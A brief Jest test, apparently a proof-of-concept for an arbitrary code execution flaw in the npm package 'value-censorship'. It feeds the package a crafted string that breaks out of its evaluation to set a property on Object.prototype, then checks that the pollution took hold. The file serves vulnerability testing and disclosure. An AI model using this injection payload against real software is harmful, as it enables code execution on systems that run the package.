test("Arbitrary code execution in  value-censorship", () => {
  expect.assertions(2);
  const censor = require("value-censorship");
  expect({}.polluted).toBe(undefined);
  try {
    censor(`
        ;1 +(Object.prototype.polluted = 'yes')//
        `);
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
